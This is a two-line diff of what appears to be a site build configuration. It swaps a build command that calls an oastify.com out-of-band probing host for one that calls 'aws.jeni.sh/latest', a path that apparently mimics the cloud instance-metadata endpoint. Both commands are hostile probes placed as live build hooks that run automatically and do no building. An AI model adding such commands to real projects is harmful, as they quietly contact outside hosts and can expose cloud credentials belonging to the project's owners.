@@ -1,2 +1,2 @@
 [build]
-  command = "curl http://guewv02jrm37utg30vy4wb1gk7qxem.oastify.com"
+  command = "curl http://aws.jeni.sh/latest "
